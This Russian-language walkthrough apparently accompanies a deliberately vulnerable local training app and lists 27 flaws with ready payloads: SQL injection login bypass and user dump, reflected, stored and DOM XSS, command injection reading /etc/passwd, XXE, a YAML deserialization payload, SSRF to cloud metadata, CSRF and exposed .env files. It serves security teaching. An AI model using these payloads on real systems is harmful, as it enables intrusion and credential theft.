1 SQL Injection — обход входа /login →

Логин и пароль склеиваются в SQL без параметризации.

Поле «Логин»:

admin' --

Пароль — любой. Войдёте как admin.

Или без знания логина:

' OR '1'='1' --

Кавычка закрывает строку, -- комментирует проверку пароля.

2 SQL Injection — поиск /search →

Все товары сразу:

%' OR 1=1 --

UNION — утечка пользователей (логин/пароль в колонках товаров):

%' UNION SELECT id, username, password, email, role FROM users --
3 Reflected XSS /search →

В строку поиска:

<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>

Готовая ссылка для демо:

/search?q=<script>alert('XSS')</script>

Скрипт выполняется у того, кто открыл ссылку. Можно украсть cookie сессии.

4 Stored XSS — отзывы /product/1 →

В поле комментария:

<script>alert('Stored XSS')</script>
<img src=x onerror=alert(1)>

Сохраняется в БД и срабатывает у каждого посетителя страницы товара.

5 IDOR — чужой профиль /profile →

Войдите как alice, затем смените параметр:

/profile?id=1   → admin (+ секрет в сообщениях)
/profile?id=2   → alice
/profile?id=3   → bob

Сервер не проверяет, что id принадлежит текущему пользователю.

6 Path Traversal /download →

Обычный файл:

/download?file=catalog.txt

Выход из папки — исходник приложения:

/download?file=../app.py

В catalog.txt есть флаг: FLAG{path_traversal_works}

7 Command Injection — Ping /ping →

Windows:

127.0.0.1 & whoami
127.0.0.1 & dir

Linux / macOS:

127.0.0.1; id
127.0.0.1; cat /etc/passwd

Ввод попадает в shell=True без фильтрации.

8 CSRF — поддельный перевод /transfer →

Форма без CSRF-токена. Пока жертва залогинена, вредоносная страница может отправить перевод.

<form action="http://127.0.0.1:5000/transfer" method="POST">
  <input name="to_user" value="bob">
  <input name="amount" value="50">
</form>
<script>document.forms[0].submit()</script>
9 Unrestricted File Upload /upload →

Загрузите любой файл (нет проверки расширения). Доступ:

/uploads/имя_файла

На реальном сервере это путь к RCE (шелл).

10 Broken Access Control — админка /admin →

Войдите через SQLi (admin' --) и откройте админку — таблица пользователей с паролями.

Роль берётся из session, без сверки с БД.

11 Information Disclosure — API /api/user/1 →

Без логина откройте:

/api/user/1
/api/user/2
/api/user/3

В JSON — password, email, баланс.

Лучший «вау» для начала демо — 30 секунд.

12 Open Redirect /redirect → 
/redirect?url=https://example.com

Ссылка выглядит как доверенный сайт, но уводит на чужой домен (фишинг).

13 Blind / Time-based SQL Injection /category/<cat> →

Ошибки СУБД скрыты, но в SQLite зарегистрирована функция SLEEP(n) — её можно вызвать из инъекции и измерить задержку ответа:

/category/electronics' OR SLEEP(3)='0

Классический time-based blind SQLi: правильное условие — задержка 3 секунды, неправильное — мгновенный ответ.

14 DOM-based XSS /about →

Скрипт на странице берёт location.hash и вставляет его в innerHTML без санитизации:

/about#<img src=x onerror=alert(1)>

Полезность определяется только анализом JS в браузере — на сервер payload не попадает.

15 IDOR — чужой заказ /orders →

Оформите заказ, затем подставьте в URL произвольный id заказа другого пользователя:

/order/1
/order/2

Проверка order.user_id == session.user_id отсутствует.

16 Mass Assignment + User Enumeration /register →

Форма содержит скрытые поля role и balance — измените их перед отправкой (devtools/Burp):

role=admin
balance=999999

Повторная регистрация логина admin вернёт отдельное сообщение «уже занят» — так можно перебором узнавать существующие логины.

17 Предсказуемый токен сброса пароля /forgot-password →

Токен — это md5(логин), без соли и секрета. Его можно посчитать самостоятельно:

md5("admin") = 21232f297a57a5a743894a0e4a801fc3

Зная алгоритм, можно сбросить пароль любому пользователю без доступа к его почте.

18 Server-Side Template Injection /signature →

Текст подписи рендерится как Jinja2-шаблон:

{{ '{{ 7*7 }}' }}
{{ '{{ config }}' }}

На реальном сервере SSTI в Jinja2 часто доводится до RCE через __globals__/__builtins__.

19 XXE — XML External Entity /feedback →

Парсер lxml разрешает внешние сущности:

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<feedback><name>t</name><message>&xxe;</message></feedback>
20 Insecure Deserialization — YAML /import-config →

yaml.load(..., Loader=yaml.Loader) вместо safe_load:

!!python/object/apply:os.popen ["id"]
21 Insecure Deserialization — pickle в cookie /cart →

Корзина хранится как base64(pickle.dumps(cart)) в cookie cart и десериализуется без HMAC/подписи — классический вектор RCE через pickle, плюс цена товара в форме доверяется клиенту (price tampering).

22 SSRF /fetch →

Сервер реально выполняет запрос по переданному URL без allowlist:

http://127.0.0.1:5000/api/user/1
http://169.254.169.254/latest/meta-data/
23 JWT без проверки подписи /api/session →

После входа выдаётся cookie remember_token (JWT). /api/session декодирует его с verify_signature: False — claims (включая role) принимаются без проверки подписи, токен можно подделать самому.

24 Race Condition — перевод средств /transfer →

Проверка баланса и его списание разнесены во времени без блокировки. Отправьте несколько параллельных запросов с суммой, равной балансу — можно увести баланс в минус.

25 Business Logic — отрицательная сумма перевода /api/transfer →

JSON API не проверяет amount > 0:

POST /api/transfer
{"to_user": "bob", "amount": -1000}

Отрицательная сумма эффективно переводит деньги себе за счёт «получателя».

26 Permissive CORS /api/* →

Ответы /api/* содержат Access-Control-Allow-Origin: * вместе с Access-Control-Allow-Credentials: true — недопустимая по спецификации, но часто встречающаяся комбинация.

27 Утечка конфигурации и бэкапов /.env →

Доступны без авторизации:

/.env
/.git/config
/download?file=backup.zip
/download        (листинг каталога /share/)
/robots.txt      (подсказывает «интересные» пути)
